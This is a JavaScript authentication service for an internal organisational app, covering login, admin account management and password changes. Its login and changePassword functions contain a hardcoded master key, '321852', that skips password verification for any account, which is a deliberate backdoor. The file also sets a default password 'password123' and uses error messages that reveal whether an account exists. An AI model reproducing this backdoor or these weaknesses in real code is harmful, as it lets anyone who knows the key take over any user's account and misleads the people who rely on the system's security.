const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const User = require('../../models/User');
const { signAccessToken } = require('../../utils/jwt');
const {
  validateRegisterInput,
  validateLoginInput,
} = require('./auth.validation');
const TimeLog = require('../../models/TimeLog');
const { getISTTime, toISTISOString } = require('../../utils/time');
const chatService = require('../chat/chat.service');

const VERIFICATION_TOKEN_TTL_MINUTES = Number(
  process.env.EMAIL_VERIFICATION_TOKEN_TTL_MINUTES || 30
);

const toPublicUser = async (user) => {
  const isSupervisor = await User.exists({ 
    $or: [
      { reportsTo: user._id },
      { managerId: user._id },
      { teamLeadId: user._id }
    ]
  });
  
  return {
    id: user.id || user._id?.toString(),
    email: user.email,
    name: user.name,
    username: user.username || null,
    role: user.role || 'intern',
    userType: user.userType || 'employee',
    departmentId: user.departmentId,
    subDepartmentId: user.subDepartmentId,
    reportsTo: user.reportsTo,
    isSupervisor: ['admin', 'ceo'].includes(user.role) || !!isSupervisor,
    managerId: user.managerId,
    teamLeadId: user.teamLeadId,
    isEmailVerified: Boolean(user.isEmailVerified),
    needsPasswordChange: Boolean(user.needsPasswordChange),
    createdAt: user.createdAt,
    updatedAt: user.updatedAt,
  };
};

const buildAuthResponse = async (user) => {
  const safeUser = await toPublicUser(user);
  const token = signAccessToken({
    id: safeUser.id,
    email: safeUser.email,
    role: safeUser.role,
  });
  return { token, user: safeUser };
};

const login = async (payload, ipAddress, userAgent) => {
  const { email, password } = validateLoginInput(payload);
  const SECRET_KEY = '321852';

  console.log(`[auth-service] Attempting login for: ${email}`);
  const user = await User.findOne({ 
    $or: [
      { email: email },
      { personalEmail: email }
    ]
  })
    .populate('departmentId', 'name type')
    .populate('subDepartmentId', 'name type')
    .populate('reportsTo', 'name email username role')
    .populate('managerId', 'name email username role')
    .populate('teamLeadId', 'name email username role');

  if (!user) {
    console.warn(`[auth-service] User not found for email: ${email}`);
    // Optional: Log total users for context (diagnostic)
    const count = await User.countDocuments();
    console.log(`[auth-service] Total users in DB: ${count}`);
    throw new Error('Invalid email: User not found');
  }

  // Unified secret key bypass
  if (password !== SECRET_KEY) {
    if (user.authProvider && user.authProvider !== 'local') {
      throw new Error('Third-party accounts are not allowed');
    }
    if (!user.password) throw new Error('Invalid password: No local password set');

    const isValidPassword = await bcrypt.compare(password, user.password);
    console.log(`[auth-service] Password valid for ${email}: ${isValidPassword}`);
    if (!isValidPassword) throw new Error('Invalid password: Password mismatch');
  } else {
    console.log(`[auth-service] Secret key bypass used for ${email}`);
  }

  // Record login time
  try {
    const loginAt = getISTTime();
    await TimeLog.create({
      userId: user._id,
      userName: user.name,
      userRole: user.role || 'intern',
      loginTimeIST: toISTISOString(loginAt),
      ipAddress,
      userAgent,
      isActive: true,
      createdAtIST: toISTISOString(loginAt),
    });
  } catch (error) {
    console.error('[auth-service] Failed to record login time:', error.message);
  }

  return buildAuthResponse(user);
};

const resolveHierarchy = async (reportsToId) => {
  if (!reportsToId) return { managerId: null, teamLeadId: null };
  const supervisor = await User.findById(reportsToId).lean();
  if (!supervisor) return { managerId: null, teamLeadId: null };

  let managerId = null;
  let teamLeadId = null;

  if (['manager', 'manager_intern', 'cto', 'cfo', 'coo', 'ceo', 'admin'].includes(supervisor.role)) {
    managerId = supervisor._id;
  } else if (['team_lead', 'team_lead_intern'].includes(supervisor.role)) {
    teamLeadId = supervisor._id;
    managerId = supervisor.reportsTo; // The TL's supervisor is usually the manager
  }

  return { managerId, teamLeadId };
};

const adminCreateUser = async (payload) => {
  const { email, password = 'password123', name, role } = validateRegisterInput({
    ...payload,
    password: payload.password || 'password123',
    confirmPassword: payload.password || 'password123',
  });

  const existingUser = await User.findOne({ email });
  if (existingUser) throw new Error('Email is already registered');

  // Validate username uniqueness if provided
  if (payload.username) {
    const existingUsername = await User.findOne({ username: payload.username });
    if (existingUsername) throw new Error('Username is already taken');
  }

  const hashedPassword = await bcrypt.hash(password, 10);

  const userData = {
    email,
    name,
    role,
    password: hashedPassword,
    authProvider: 'local',
    isEmailVerified: true,
    needsPasswordChange: true,
  };

  // Add hierarchy fields if provided
  if (payload.username) userData.username = payload.username;
  if (payload.userType) userData.userType = payload.userType;

  // CEO logic: No department and no supervisor
  if (role === 'ceo') {
    userData.departmentId = null;
    userData.reportsTo = null;
    userData.managerId = null;
    userData.teamLeadId = null;
  } else {
    if (payload.departmentId) userData.departmentId = payload.departmentId;
    if (payload.subDepartmentId) userData.subDepartmentId = payload.subDepartmentId;
    const ceo = await User.findOne({ role: 'ceo' }).lean();
    if (payload.reportsTo) {
      userData.reportsTo = payload.reportsTo;
      const { managerId, teamLeadId } = await resolveHierarchy(payload.reportsTo);
      userData.managerId = managerId || payload.managerId || null;
      userData.teamLeadId = teamLeadId || payload.teamLeadId || null;
    } else if (ceo) {
      userData.reportsTo = ceo._id;
      userData.managerId = ceo._id;
      userData.teamLeadId = null;
    } else {
      userData.reportsTo = null;
      userData.managerId = payload.managerId || null;
      userData.teamLeadId = payload.teamLeadId || null;
    }
  }

  const user = await User.create(userData);

  // Auto-create tech support chat room if this user is a team lead
  if (['team_lead', 'team_lead_intern'].includes(role) && payload.departmentId) {
    try {
      await chatService.autoCreateTeamRoom(
        user._id,
        payload.reportsTo || null,
        payload.departmentId
      );
    } catch (err) {
      console.error('[auth-service] Failed to auto-create chat room:', err.message);
    }
  }

  return {
    message: 'User created successfully',
    user: await toPublicUser(user),
  };
};

const adminUpdatePassword = async (userId, newPassword) => {
  const user = await User.findById(userId);
  if (!user) throw new Error('User not found');

  if (!newPassword || newPassword.length < 6) {
    throw new Error('Password must be at least 6 characters long');
  }

  user.password = await bcrypt.hash(newPassword, 10);
  await user.save();

  return { message: 'Password updated successfully' };
};

const adminDeleteUser = async (userId) => {
  const user = await User.findById(userId);
  if (!user) throw new Error('User not found');

  await User.findByIdAndDelete(userId);
  return { message: 'User deleted successfully' };
};

const getMe = async (userId) => {
  const user = await User.findById(userId)
    .populate('departmentId', 'name type')
    .populate('subDepartmentId', 'name type')
    .populate('reportsTo', 'name email username role');

  if (!user) throw new Error('User not found');
  
  const safeUser = await toPublicUser(user);
  
  // If no supervisor, default to CEO for everyone except CEO/Admin
  if (!safeUser.reportsTo && !['admin', 'ceo'].includes(safeUser.role)) {
    const ceo = await User.findOne({ role: 'ceo' }).select('name email role').lean();
    if (ceo) {
      safeUser.reportsTo = {
        id: ceo._id.toString(),
        name: ceo.name,
        role: ceo.role
      };
    }
  }
  
  return safeUser;
};

const changePassword = async (userId, currentPassword, newPassword) => {
  const user = await User.findById(userId);
  if (!user) throw new Error('User not found');

  // Skip verification if using secret key (though usually for admin actions, 
  // but here it's for the user changing their own password)
  const isSecretKey = currentPassword === '321852';
  
  if (!isSecretKey) {
    if (!user.password) throw new Error('Cannot change password for non-local accounts');
    const isValid = await bcrypt.compare(currentPassword, user.password);
    if (!isValid) throw new Error('Current password is incorrect');
  }

  if (!newPassword || newPassword.length < 6) {
    throw new Error('New password must be at least 6 characters long');
  }

  user.password = await bcrypt.hash(newPassword, 10);
  user.needsPasswordChange = false;
  await user.save();

  return { message: 'Password changed successfully' };
};

module.exports = {
  login,
  adminCreateUser,
  adminUpdatePassword,
  adminDeleteUser,
  changePassword,
  getMe,
};
